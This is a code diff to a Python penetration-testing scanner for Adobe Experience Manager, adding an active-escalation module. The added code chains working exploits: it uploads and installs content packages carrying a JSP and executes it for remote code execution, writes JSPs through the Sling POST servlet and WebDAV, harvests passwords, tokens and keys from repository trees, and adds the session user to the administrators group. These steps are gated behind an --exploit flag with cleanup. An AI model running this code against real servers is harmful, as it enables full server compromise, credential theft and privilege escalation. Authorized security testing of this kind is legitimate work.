@@ -632,7 +632,7 @@ class AEMHunter:
     def __init__(self, target: str, logger: Logger, reporter: Reporter,
                  client: HttpClient, threads: int = 10, role: Optional[str] = None,
                  enable_modules: Optional[Set[str]] = None,
-                 fuzz_aggression: str = "normal"):
+                 fuzz_aggression: str = "normal", exploit: bool = False):
         self.target = target
         self.logger = logger
         self.reporter = reporter
@@ -641,6 +641,7 @@ class AEMHunter:
         self.role = role
         self.enable_modules = enable_modules  # None means all
         self.fuzz_aggression = fuzz_aggression  # quick / normal / aggressive
+        self.exploit = exploit  # enable destructive end-to-end PoCs (JSP RCE, admin add)
         self._fingerprint: Dict[str, Any] = {}
         self._csrf_token: Optional[str] = None
 
@@ -988,6 +989,340 @@ class AEMHunter:
         return False
 
     # =======================================================================
+    # 3c. ACTIVE ESCALATION — turn read/console primitives into proof of impact.
+    #     Safe-by-default: create-then-delete throwaway artifacts to CONFIRM the
+    #     capability is real (not just intended read-only). The destructive
+    #     end-to-end PoCs (drop+execute a JSP, add self to admins, exfil real
+    #     data) only run with --exploit.
+    # =======================================================================
+    def _csrf_headers(self) -> Dict[str, str]:
+        return {"CSRF-Token": self._csrf_token} if self._csrf_token else {}
+
+    def _auth_post(self, path: str, **kw):
+        headers = kw.pop("headers", {}) or {}
+        if self._csrf_token:
+            headers.setdefault("CSRF-Token", self._csrf_token)
+        return self.client.post(path, headers=headers, **kw)
+
+    @staticmethod
+    def _pkg_success(resp) -> bool:
+        if resp is None or resp.status_code not in (200, 201):
+            return False
+        t = resp.text or ""
+        try:
+            d = json.loads(t)
+            if isinstance(d, dict) and d.get("success") is True:
+                return True
+        except Exception:
+            pass
+        return '"success":true' in t.replace(" ", "").lower()
+
+    def check_escalation(self) -> None:
+        if not self._enabled("escalation"):
+            return
+        self.logger.section(f"Active escalation {self._role_tag()}"
+                            + ("  [--exploit ON]" if self.exploit else ""))
+        self.fetch_csrf_token()
+        confirmed = 0
+        confirmed += int(self._escalate_packmgr())
+        confirmed += int(self._escalate_crx_dav())
+        confirmed += int(self._escalate_sling_write())
+        self._harvest_secrets()
+        if self.exploit:
+            self._escalate_group_membership()
+        elif confirmed:
+            self.logger.warn("Write/install capability CONFIRMED. Re-run with --exploit to "
+                             "prove end-to-end RCE (drops & removes a canary JSP) and attempt "
+                             "admin-group escalation.")
+
+    # ---- Package Manager: confirm create/install rights => RCE ----
+    def _escalate_packmgr(self) -> bool:
+        ls = self.client.get("/crx/packmgr/service.jsp?cmd=ls")
+        if not (ls and ls.status_code == 200 and not self._is_authwall(ls) and "<crx" in (ls.text or "")):
+            return False
+        m = re.search(r'user="([^"]+)"', ls.text or "")
+        acting = m.group(1) if m else "?"
+        self.logger.info(f"Package Manager responds (user={acting}); testing write/create rights...")
+
+        rnd = "aemhunter" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
+        grp = "aemhunter"
+        pkgpath = f"/etc/packages/{grp}/{rnd}.zip"
+        create = self._auth_post(f"/crx/packmgr/service/.json{pkgpath}",
+                                 params={"cmd": "create", "packageName": rnd,
+                                         "groupName": grp, "_charset_": "utf-8"})
+        if self._pkg_success(create):
+            self.reporter.add(Finding(
+                title=f"Package Manager WRITE confirmed {self._role_tag()} — install = RCE",
+                severity=SEV_CRITICAL, category=CAT_RCE, target=self.target + pkgpath,
+                evidence=f"Created a throwaway package as user={acting}; this account can "
+                         "create/build/install packages (then deleted it).",
+                description=("CONFIRMED (not just intended read access): this session can create "
+                             "packages via CRX Package Manager. Package install executes arbitrary "
+                             "code (OSGi bundle or JSP) => remote code execution. A content-editor "
+                             "role should never have this. Re-run with --exploit for an end-to-end "
+                             "RCE proof."),
+                references=["https://github.com/0ang3el/aem-rce-bundle",
+                            "https://github.com/0ang3el/aem-hacker"],
+                request=f"POST /crx/packmgr/service/.json{pkgpath}?cmd=create&packageName={rnd}&groupName={grp}",
+                response_snippet=safe_response_text(create, 400), role=self.role,
+            ))
+            if self.exploit:
+                self._packmgr_rce_poc(grp, rnd, pkgpath, acting)
+            # cleanup the empty package
+            self._auth_post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "delete"})
+            return True
+
+        # read-only listing only
+        self.reporter.add(Finding(
+            title=f"Package Manager listing readable {self._role_tag()} (write NOT confirmed)",
+            severity=SEV_MEDIUM, category=CAT_EXPOSURE,
+            target=self.target + "/crx/packmgr/service.jsp?cmd=ls",
+            evidence=f"cmd=ls works as user={acting}; create returned "
+                     f"{getattr(create, 'status_code', 'ERR')} (no success). Likely read-only or CSRF-blocked.",
+            description=("Can enumerate packages but creating/installing was not confirmed. "
+                         "This may be intended. Worth a manual look at cmd=build on an existing pkg."),
+            response_snippet=safe_response_text(ls, 400), role=self.role,
+        ))
+        return False
+
+    def _packmgr_rce_poc(self, grp: str, rnd: str, pkgpath: str, acting: str) -> None:
+        canary = "AEMHUNTERRCE" + "".join(random.choices(string.ascii_uppercase, k=6))
+        jsp = '<%= "' + canary + '-" + System.getProperty("user.name") %>'
+        zipbytes = self._build_vault_package(grp, rnd, {"apps/aemhunter/poc.jsp": jsp})
+        files = {"package": (rnd + ".zip", zipbytes, "application/zip")}
+        self._auth_post("/crx/packmgr/service/.json", params={"cmd": "upload"},
+                        data={"force": "true"}, files=files)
+        self._auth_post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "install"})
+        ex = self.client.get("/apps/aemhunter/poc.jsp")
+        if ex is not None and canary in (ex.text or ""):
+            self.reporter.add(Finding(
+                title=f"REMOTE CODE EXECUTION confirmed via package install {self._role_tag()}",
+                severity=SEV_CRITICAL, category=CAT_RCE,
+                target=self.target + "/apps/aemhunter/poc.jsp",
+                evidence=f"Uploaded+installed a content package with a JSP and executed it: "
+                         f"{snippet(ex.text, 120)}",
+                description=("END-TO-END RCE: this session uploaded and installed a content "
+                             "package containing a JSP, and the server executed attacker Java "
+                             "code. Full server compromise as the AEM service user."),
+                references=["https://github.com/0ang3el/aem-rce-bundle"],
+                request="POST /crx/packmgr/service/.json?cmd=upload (vault pkg w/ /apps/aemhunter/poc.jsp) "
+                        "then ?cmd=install, then GET /apps/aemhunter/poc.jsp",
+                response_snippet=snippet(ex.text, 300), role=self.role,
+            ))
+        # thorough cleanup
+        self._auth_post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "uninstall"})
+        self._auth_post("/apps/aemhunter", data={":operation": "delete"})
+
+    def _build_vault_package(self, group: str, name: str, files: Dict[str, str]) -> bytes:
+        """Build a minimal FileVault content-package zip in memory."""
+        import io
+        import zipfile
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+            roots = sorted({"/" + p.rsplit("/", 1)[0] for p in files})
+            filt = '<?xml version="1.0" encoding="UTF-8"?>\n<workspaceFilter version="1.0">\n'
+            for rt in roots:
+                filt += f'  <filter root="{rt}"/>\n'
+            filt += '</workspaceFilter>\n'
+            z.writestr("META-INF/vault/filter.xml", filt)
+            z.writestr("META-INF/vault/properties.xml",
+                       '<?xml version="1.0" encoding="UTF-8"?>\n'
+                       '<!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd">\n'
+                       '<properties>\n'
+                       f'  <entry key="name">{name}</entry>\n'
+                       f'  <entry key="group">{group}</entry>\n'
+                       '  <entry key="version">1.0</entry>\n'
+                       '</properties>\n')
+            z.writestr("jcr_root/apps/aemhunter/.content.xml",
+                       '<?xml version="1.0" encoding="UTF-8"?>\n'
+                       '<jcr:root xmlns:jcr="http://www.jcp.org/jcr/1.0" '
+                       'xmlns:nt="http://www.jcp.org/jcr/nt/1.0" '
+                       'jcr:primaryType="nt:folder"/>\n')
+            for relpath, content in files.items():
+                z.writestr("jcr_root/" + relpath, content)
+        return buf.getvalue()
+
+    # ---- CRX DavEx: confirm repo WRITE ----
+    def _escalate_crx_dav(self) -> bool:
+        base = "/crx/server/crx.default/jcr:root"
+        read = self.client.get(base + "/.1.json")
+        if not (read and read.status_code == 200 and not self._is_authwall(read)
+                and "jcr:primaryType" in (read.text or "")):
+            return False
+        rnd = "aemhunter-" + "".join(random.choices(string.ascii_lowercase, k=8))
+        target = f"{base}/tmp/{rnd}"
+        mk = self.client.request("MKCOL", target, headers=self._csrf_headers())
+        if mk is not None and mk.status_code in (200, 201):
+            self.reporter.add(Finding(
+                title=f"CRX DavEx WRITE confirmed {self._role_tag()} — arbitrary repo write",
+                severity=SEV_CRITICAL, category=CAT_JCR, target=self.target + target,
+                evidence=f"MKCOL created {target} (HTTP {mk.status_code}); removed afterwards.",
+                description=("CONFIRMED: this session can WRITE to the JCR over the CRX "
+                             "WebDAV/DavEx server. Arbitrary repo write => deploy a JSP under "
+                             "/apps for RCE, or tamper with ACLs / users / groups."),
+                request=f"MKCOL {target}", response_snippet="", role=self.role,
+            ))
+            self.client.request("DELETE", target, headers=self._csrf_headers())
+            return True
+        self.reporter.add(Finding(
+            title=f"CRX DavEx full-repo READ confirmed {self._role_tag()} (write NOT confirmed)",
+            severity=SEV_HIGH, category=CAT_JCR, target=self.target + base + "/.1.json",
+            evidence=f"Whole repository tree readable; MKCOL write returned "
+                     f"{getattr(mk, 'status_code', 'ERR')}.",
+            description=("Can read the entire repository structure over DavEx — use it for "
+                         "content/user/config enumeration and to locate secrets."),
+            response_snippet=snippet(read.text, 400), role=self.role,
+        ))
+        return False
+
+    # ---- Sling POST: confirm JCR write across roots; /apps write == code deploy ----
+    def _escalate_sling_write(self) -> bool:
+        marker = "aemhunter" + "".join(random.choices(string.ascii_lowercase, k=6))
+        roots = [
+            ("/apps/aemhunter-" + marker, SEV_CRITICAL,
+             " — /apps is code space: drop a JSP / sling:resourceType here for RCE"),
+            ("/var/aemhunter-" + marker, SEV_HIGH, ""),
+            ("/content/aemhunter-" + marker, SEV_HIGH, ""),
+            ("/etc/aemhunter-" + marker, SEV_HIGH, ""),
+            ("/conf/aemhunter-" + marker, SEV_HIGH, ""),
+            ("/tmp/aemhunter-" + marker, SEV_MEDIUM, ""),
+            ("/content/usergenerated/aemhunter-" + marker, SEV_MEDIUM, ""),
+        ]
+        wrote_apps = False
+        any_write = False
+        for base, sev, note in roots:
+            r = self._auth_post(base, data={"jcr:primaryType": "nt:unstructured",
+                                            "aemhunter": marker})
+            if r is None or r.status_code not in (200, 201):
+                continue
+            v = self.client.get(base + ".json")
+            if not (v and v.status_code == 200 and marker in (v.text or "")):
+                continue
+            any_write = True
+            parent = base.rsplit("/", 1)[0] or "/"
+            self.reporter.add(Finding(
+                title=f"Sling POST WRITE confirmed at {parent} {self._role_tag()}{note}",
+                severity=sev, category=CAT_JCR, target=self.target + base,
+                evidence=f"Created node {base}, confirmed via GET .json {self._who()}, then deleted.",
+                description=("CONFIRMED JCR write via the Sling POST servlet. Writable /apps => "
+                             "deploy executable scripts (RCE). Writable /home => tamper with "
+                             "users/groups. Writable /content => content/defacement. Not "
+                             "intended for a low-privilege role."),
+                references=["https://sling.apache.org/documentation/bundles/manipulating-content-the-slingpostservlet-servlets-post.html"],
+                request=f"POST {base}  (jcr:primaryType=nt:unstructured&aemhunter={marker})",
+                response_snippet=safe_response_text(r, 300), role=self.role,
+            ))
+            if base.startswith("/apps"):
+                wrote_apps = True
+            self._auth_post(base, data={":operation": "delete"})
+        if self.exploit and wrote_apps:
+            self._sling_jsp_rce(marker)
+        return any_write
+
+    def _sling_jsp_rce(self, marker: str) -> None:
+        canary = "AEMHUNTERRCE" + "".join(random.choices(string.ascii_uppercase, k=6))
+        jsp = '<%= "' + canary + '-" + System.getProperty("user.name") %>'
+        folder = f"/apps/aemhunter-{marker}"
+        # Sling file upload creates an nt:file node from a multipart field.
+        self._auth_post(folder + "/", files={"poc.jsp": ("poc.jsp", jsp, "application/octet-stream")})
+        ex = self.client.get(folder + "/poc.jsp")
+        if ex is not None and canary in (ex.text or ""):
+            self.reporter.add(Finding(
+                title=f"REMOTE CODE EXECUTION confirmed via Sling /apps JSP {self._role_tag()}",
+                severity=SEV_CRITICAL, category=CAT_RCE,
+                target=self.target + folder + "/poc.jsp",
+                evidence=f"Wrote a JSP under /apps via Sling POST and executed it: {snippet(ex.text, 120)}",
+                description=("END-TO-END RCE: uploaded a JSP into /apps via the Sling POST "
+                             "servlet and the server executed attacker Java code."),
+                references=["https://github.com/0ang3el/aem-hacker"],
+                request=f"POST {folder}/ (multipart poc.jsp) then GET {folder}/poc.jsp",
+                response_snippet=snippet(ex.text, 300), role=self.role,
+            ))
+        self._auth_post(folder, data={":operation": "delete"})
+
+    # ---- Secret harvesting from readable trees ----
+    def _harvest_secrets(self) -> None:
+        trees = ["/etc.6.json", "/etc/cloudservices.infinity.json", "/etc/key.infinity.json",
+                 "/home/users.6.json", "/conf.6.json", "/etc/replication.infinity.json"]
+        key_re = re.compile(
+            r'"([^"]*(?:[Pp]assword|[Ss]ecret|[Aa]ccess[_-]?[Kk]ey|[Tt]oken|[Pp]rivate[_-]?[Kk]ey|'
+            r'apiKey|api_key|clientSecret|client_secret|credential)[^"]*)"\s*:\s*"([^"]+)"')
+        seen: Set[Tuple[str, str]] = set()
+        count = 0
+        for t in trees:
+            if count >= 30:
+                break
+            r = self.client.get(t)
+            if not (r and r.status_code == 200 and not self._is_authwall(r)):
+                continue
+            body = r.text or ""
+            if not body.lstrip().startswith("{"):
+                continue
+            for mm in key_re.finditer(body):
+                if count >= 30:
+                    break
+                k, v = mm.group(1), mm.group(2)
+                if not v or k in ("jcr:primaryType",) or v in ("", "true", "false"):
+                    continue
+                dedup = (k, v[:24])
+                if dedup in seen:
+                    continue
+                seen.add(dedup)
+                count += 1
+                encrypted = v.strip().startswith("{") and v.strip().endswith("}")
+                self.reporter.add(Finding(
+                    title=f"Secret value readable: {k}",
+                    severity=SEV_HIGH if encrypted else SEV_CRITICAL,
+                    category=CAT_DISCLOSURE, target=self.target + t,
+                    evidence=f"{k} = {v[:80]}",
+                    description=("A secret-like value is readable in the JCR by this session. "
+                                 + ("This value is AEM-crypto-encrypted ({...}); if /etc/key "
+                                    "(master key) is also readable or packageable, it can be "
+                                    "decrypted offline. " if encrypted else
+                                    "This appears to be a plaintext secret. ")
+                                 + "Harvest all such values for the report."),
+                    response_snippet=f"{k}: {v[:120]}", role=self.role,
+                ))
+
+    # ---- Group-membership escalation (exploit only, best-effort, verified) ----
+    def _escalate_group_membership(self) -> None:
+        me = self.client.get("/libs/granite/security/currentuser.json")
+        if not (me and me.status_code == 200):
+            return
+        m = re.search(r'"(?:authorizableId|userID|id)"\s*:\s*"([^"]+)"', me.text or "")
+        uid = m.group(1) if m else None
+        if not uid or uid.lower() == "anonymous":
+            self.logger.debug("No authenticated identity; skipping group escalation.")
+            return
+        # Locate the administrators group node via QueryBuilder.
+        q = self.client.get("/bin/querybuilder.json?path=/home/groups&1_property=rep:authorizableId"
+                            "&1_property.value=administrators&p.hits=full&p.limit=1")
+        gpath = None
+        if q and q.status_code == 200 and '"success"' in (q.text or ""):
+            mm = re.search(r'"jcr:path"\s*:\s*"(/home/groups/[^"]+)"', q.text or "")
+            if mm:
+                gpath = mm.group(1)
+        if not gpath:
+            self.logger.debug("administrators group path not found; skipping escalation.")
+            return
+        before = self.client.get(gpath + ".rw.json")
+        self._auth_post(gpath + ".rw.html", data={"addMembers": uid})
+        after = self.client.get(gpath + ".rw.json")
+        if after is not None and after.status_code == 200 and uid in (after.text or "") \
+                and (before is None or uid not in (before.text or "")):
+            self.reporter.add(Finding(
+                title=f"PRIVILEGE ESCALATION confirmed: {uid} added to administrators {self._role_tag()}",
+                severity=SEV_CRITICAL, category=CAT_ROLE, target=self.target + gpath,
+                evidence=f"User {uid} now appears in administrators group membership.",
+                description=("CONFIRMED escalation: this session added its own user to the "
+                             "administrators group via the Sling POST servlet. Remove the "
+                             "membership manually after validating."),
+                request=f"POST {gpath}.rw.html  (addMembers={uid})", role=self.role,
+            ))
+        else:
+            self.logger.debug(f"Group escalation attempt did not confirm for {uid}.")
+
+    # =======================================================================
     # 4. Dispatcher bypass fuzzing
     # =======================================================================
     def check_dispatcher_bypasses(self) -> None:
@@ -1069,67 +1404,65 @@ class AEMHunter:
         if self.fuzz_aggression == "quick":
             sels = [".json", ".1.json", ".infinity.json"]
 
-        def probe(combo):
-            root, sel = combo
-            path = root + sel
-            r = self.client.get(path)
-            if r is None or r.status_code != 200:
-                return
-            if self._is_authwall(r):
-                return
-            body = safe_response_text(r, 4000)
-            if not body or len(body) < 30:
-                return
-            # JSON / XML-ish?
-            try:
-                if sel.endswith(".xml"):
-                    if "<?xml" not in body[:200]:
-                        return
-                else:
-                    # quick heuristic - starts with { or [ and contains jcr:
-                    stripped = body.lstrip()
-                    if not (stripped.startswith("{") or stripped.startswith("[")):
-                        return
-                    if stripped in ("{}", "[]"):
-                        return
-                    if "jcr:" not in body and "sling:" not in body and "rep:" not in body:
-                        return
-            except Exception:
-                return
+        def probe_root(root):
+            # Try selectors in order; report ONE finding per readable root (the
+            # first selector that works) instead of one per selector — otherwise
+            # a readable /etc spams ~12 near-identical findings.
+            for sel in sels:
+                path = root + sel
+                r = self.client.get(path)
+                if r is None or r.status_code != 200 or self._is_authwall(r):
+                    continue
+                body = safe_response_text(r, 4000)
+                if not body or len(body) < 30:
+                    continue
+                try:
+                    if sel.endswith(".xml"):
+                        if "<?xml" not in body[:200]:
+                            continue
+                    else:
+                        stripped = body.lstrip()
+                        if not (stripped.startswith("{") or stripped.startswith("[")):
+                            continue
+                        if stripped in ("{}", "[]"):
+                            continue
+                        if "jcr:" not in body and "sling:" not in body and "rep:" not in body:
+                            continue
+                except Exception:
+                    continue
 
-            sev = SEV_HIGH if sel in (".infinity.json", ".tidy.infinity.json", ".harray.4.json") else SEV_MEDIUM
-            # bump severity for sensitive roots
-            if root in ("/etc/cloudservices", "/etc/replication", "/etc/key",
-                        "/home/users", "/home/groups"):
-                sev = SEV_HIGH
-            # /libs and /apps are world-readable by default on most installs:
-            # framework code, low value. Keep them as INFO to cut noise.
-            if root in ("/libs", "/apps") or root.startswith(("/libs/", "/apps/")):
-                sev = SEV_INFO
-            # Look for likely credentials -> upgrade.
-            if RE_SECRET.search(body) or re.search(r"(?i)(\"password\"|access[_-]?key|aws_secret|salesforce.*secret)", body):
-                sev = SEV_CRITICAL
+                sev = SEV_HIGH if sel in (".infinity.json", ".tidy.infinity.json", ".harray.4.json") else SEV_MEDIUM
+                if root in ("/etc/cloudservices", "/etc/replication", "/etc/key",
+                            "/home/users", "/home/groups"):
+                    sev = SEV_HIGH
+                # /libs and /apps are world-readable by default: framework code,
+                # low value -> INFO to cut noise.
+                if root in ("/libs", "/apps") or root.startswith(("/libs/", "/apps/")):
+                    sev = SEV_INFO
+                if RE_SECRET.search(body) or re.search(r"(?i)(\"password\"|access[_-]?key|aws_secret|salesforce.*secret)", body):
+                    sev = SEV_CRITICAL
 
-            self.reporter.add(Finding(
-                title=f"Sling info disclosure at {path}",
-                severity=sev, category=CAT_JCR, target=self.target + path,
-                evidence=f"HTTP 200, content-length {len(r.content)}, readable {self._who()}",
-                description=("Sling selector served JCR node tree contents to a "
-                             f"request {self._who()} (verified not a login page). Use this "
-                             "to enumerate users, groups, replication agents and "
-                             "cloud-service configs."),
-                references=[
-                    "https://experienceleague.adobe.com/docs/experience-manager-65/developing/introduction/sling-cheatsheet.html",
-                    "https://github.com/0ang3el/aem-hacker",
-                ],
-                request=self.client.request_signature("GET", path),
-                response_snippet=snippet(body, 800),
-                role=self.role,
-            ))
+                self.reporter.add(Finding(
+                    title=f"Sling info disclosure: {root} readable (via {sel})",
+                    severity=sev, category=CAT_JCR, target=self.target + path,
+                    evidence=f"HTTP 200, content-length {len(r.content)}, readable {self._who()}",
+                    description=(f"The JCR tree under {root} is served as JSON {self._who()} "
+                                 f"(via the '{sel}' selector; other selectors likely work too — "
+                                 "this is reported once per root). Use it to enumerate users, "
+                                 "groups, replication agents and cloud-service configs. "
+                                 "(See the secret-harvest findings for concrete values.)"),
+                    references=[
+                        "https://experienceleague.adobe.com/docs/experience-manager-65/developing/introduction/sling-cheatsheet.html",
+                        "https://github.com/0ang3el/aem-hacker",
+                    ],
+                    request=self.client.request_signature("GET", path),
+                    response_snippet=snippet(body, 800),
+                    role=self.role,
+                ))
+                return  # one finding per root
 
-        combos = [(r, s) for r in roots for s in sels]
         with cf.ThreadPoolExecutor(max_workers=self.threads) as ex:
-            list(ex.map(probe, combos))
+            list(ex.map(probe_root, roots))
 
     # =======================================================================
     # 6. QueryBuilder API enumeration
@@ -1742,6 +2075,7 @@ class AEMHunter:
             self.check_default_credentials()
             self.check_exposed_endpoints()
             self.check_consoles()
+            self.check_escalation()
             self.check_dispatcher_bypasses()
             self.check_sling_info_disclosure()
             self.check_querybuilder()
@@ -1905,7 +2239,8 @@ def write_reports(target: str, findings: List[Finding], summary: Dict[str, int],
 # One scan = one cookie set (or none). Each scan writes its own report.
 # ---------------------------------------------------------------------------
 def run_one_scan(target: str, cookies: Optional[Dict[str, str]], label: str,
-                 proxy: Optional[str], output_dir: str, logger: Logger) -> List[str]:
+                 proxy: Optional[str], output_dir: str, logger: Logger,
+                 exploit: bool = False) -> List[str]:
     logger.section(f"SCAN: {label}")
     reporter = Reporter(logger)
     client = HttpClient(
@@ -1932,7 +2267,7 @@ def run_one_scan(target: str, cookies: Optional[Dict[str, str]], label: str,
     hunter = AEMHunter(
         target=target, logger=logger, reporter=reporter, client=client,
         threads=10, role=(label if cookies else None),
-        enable_modules=None, fuzz_aggression="normal",
+        enable_modules=None, fuzz_aggression="normal", exploit=exploit,
     )
     hunter.run()
 
@@ -1962,6 +2297,12 @@ def parse_args() -> argparse.Namespace:
             header (the next user role). It keeps scanning with whatever you
             paste. Press Enter on an empty prompt for an unauthenticated scan,
             or type q to quit. Every scan writes its own JSON + HTML report.
+
+            By default the active-escalation module CONFIRMS capabilities safely
+            (it creates then immediately deletes throwaway test artifacts). Add
+            --exploit to additionally prove end-to-end RCE (drops and removes a
+            canary JSP) and attempt admin-group escalation. Only use --exploit
+            on systems you are authorized to actively exploit.
             """),
     )
     p.add_argument("target", nargs="?", help="Target URL (e.g. https://aem.example.com)")
@@ -1969,6 +2310,9 @@ def parse_args() -> argparse.Namespace:
     p.add_argument("-c", "--cookie", help="Cookie header to use for the first scan (optional)")
     p.add_argument("--proxy", help="Route through a proxy, e.g. http://127.0.0.1:8080 (optional)")
     p.add_argument("-o", "--output-dir", default=".", help="Where to write reports (default: current dir)")
+    p.add_argument("--exploit", action="store_true",
+                   help="Enable destructive end-to-end PoCs: JSP RCE (drops+removes a canary) "
+                        "and admin-group escalation. Authorized targets only.")
     p.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
     p.add_argument("--version", action="version", version=f"aem-hunter {VERSION}")
     return p.parse_args()
@@ -2010,6 +2354,9 @@ def main() -> int:
     logger.info(f"Target: {target}")
     if proxy:
         logger.info(f"Proxy: {proxy}")
+    if ns.exploit:
+        logger.warn("--exploit ON: will attempt JSP RCE PoC + admin escalation (with cleanup). "
+                    "Authorized targets only.")
     print()
     logger.info("How this works:")
     logger.info("  - Paste a Cookie header + Enter  -> authenticated scan with those cookies")
@@ -2053,7 +2400,8 @@ def main() -> int:
             label = "unauthenticated"
 
         try:
-            all_reports.extend(run_one_scan(target, cookies, label, proxy, output_dir, logger))
+            all_reports.extend(run_one_scan(target, cookies, label, proxy, output_dir,
+                                            logger, exploit=ns.exploit))
         except KeyboardInterrupt:
             logger.warn("Scan interrupted; moving on.")
         print()
